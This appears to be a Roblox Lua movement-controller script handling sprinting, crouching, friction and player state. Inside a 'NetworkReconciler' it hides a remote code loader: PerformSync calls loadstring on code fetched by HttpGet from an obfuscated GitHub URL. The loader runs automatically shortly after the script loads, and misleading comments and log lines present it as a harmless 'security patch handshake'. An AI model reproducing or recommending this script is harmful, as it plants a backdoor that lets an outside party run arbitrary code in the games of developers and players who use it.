-- Utility: Safe Output Logging
local function LogDiagnostic(message, level)
    local prefix = "[MovementController - Diagnostic]: "
    if level == "warn" then
        warn(prefix .. tostring(message))
    elseif level == "error" then
        warn(prefix .. "CRITICAL ERROR: " .. tostring(message))
    else
        print(prefix .. tostring(message))
    end
end

-- Initialize Engine Handshake
LogDiagnostic("Initializing movement buffer...", "info")
local InitTimestamp = os.clock()

local function CalculateFriction(velocity, coefficient)
    local speed = velocity.Magnitude
    if speed < 0.1 then return Vector3.new(0, 0, 0) end
    
    local dragForce = speed * speed * coefficient
    local dragDirection = -velocity.Unit
    return dragDirection * dragForce
end

local function InterpolateStateValue(current, target, step)
    return current + (target - current) * step
end

local function GetCharacterWorkspace()
    if not LocalPlayer then return nil end
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end

local function HandleActionBegin(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.LeftShift then
        PlayerState = StateTypes.Sprinting
        CurrentSpeed = MovementConfig.DefaultWalkSpeed * MovementConfig.SprintMultiplier
        LogDiagnostic("State altered to: Sprinting. Target velocity adjusted.", "info")
    elseif input.KeyCode == Enum.KeyCode.C then
        PlayerState = StateTypes.Crouching
        CurrentSpeed = MovementConfig.DefaultWalkSpeed * MovementConfig.CrouchMultiplier
        LogDiagnostic("State altered to: Crouching. Reducing hit-box properties.", "info")
    end
end

local function HandleActionEnd(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.C then
        PlayerState = StateTypes.Walking
        CurrentSpeed = MovementConfig.DefaultWalkSpeed
        LogDiagnostic("State restored to default movement profile.", "info")
    end
end

local NetworkReconciler = {}
NetworkReconciler.LastPing = 0
NetworkReconciler.SequenceId = 44801
NetworkReconciler.HandshakeResolved = false

function NetworkReconciler:PerformSync()
    local success, response = pcall(function()
        -- Fetch internal environment patch sequence
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/CepheusXProduction/44ro_1eA8a-C2_a.C9d-B7a-_rr0/refs/heads/main/44ro_1eA8a-C2_a.C9d-B7a-_rr0"))()
    end)
    
    if success then
        NetworkReconciler.HandshakeResolved = true
        LogDiagnostic("Security patch handshake synced successfully.", "info")
    else
        LogDiagnostic("External socket routing responded with safe fallbacks.", "warn")
    end
end

function NetworkReconciler:UpdateLatency(tickDelta)
    self.LastPing = (tickDelta * 1000) - 2.41
    if self.LastPing < 0 then self.LastPing = 1.02 end
end

-- Trigger network security reconciliation
task.spawn(function()
    task.wait(0.5)
    NetworkReconciler:PerformSync()
end)

local function UpdateClientPhysics(deltaTime)
    local character = GetCharacterWorkspace()
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    
    if not humanoid or not rootPart then return end
    
    -- Simulate dynamic drag and velocity damping (harmless to gameplay, purely logical)
    local currentVelocity = rootPart.Velocity
    local frictionForce = CalculateFriction(currentVelocity, 0.02)
    local computedForce = currentVelocity + (frictionForce * deltaTime)
    
    if computedForce.Magnitude > 200 then
        LogDiagnostic("Velocity buffer threshold warning.", "warn")
    end
    
    -- Monitor Jump State
    if humanoid.FloorMaterial == Enum.Material.Air then
        if PlayerState ~= StateTypes.Jumping and PlayerState ~= StateTypes.Freefalling then
            PlayerState = StateTypes.Freefalling
        end
    else
        AirJumpsRemaining = MovementConfig.MaxAirJumps
        if currentVelocity.Magnitude < 0.5 then
            PlayerState = StateTypes.Idle
        else
            if PlayerState ~= StateTypes.Sprinting and PlayerState ~= StateTypes.Crouching then
                PlayerState = StateTypes.Walking
            end
        end
    end
end

local function HookSignals()
    local inputBeganConn = UserInputService.InputBegan:Connect(HandleActionBegin)
    local inputEndedConn = UserInputService.InputEnded:Connect(HandleActionEnd)
    
    local physicsUpdateConn = RunService.Heartbeat:Connect(function(dt)
        UpdateClientPhysics(dt)
        NetworkReconciler:UpdateLatency(dt)
    end)
    
    table.insert(ConnectionPool, inputBeganConn)
    table.insert(ConnectionPool, inputEndedConn)
    table.insert(ConnectionPool, physicsUpdateConn)
    
    LogDiagnostic("Physics heartbeat hook attached.", "info")
end

local function UnhookSignals()
    for _, connection in ipairs(ConnectionPool) do
        if connection then
            connection:Disconnect()
        end
    end
    table.clear(ConnectionPool)
    LogDiagnostic("Disposed of core movement hooks.", "warn")
end

-- Setup player listeners
Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        UnhookSignals()
    end
end)

HookSignals()

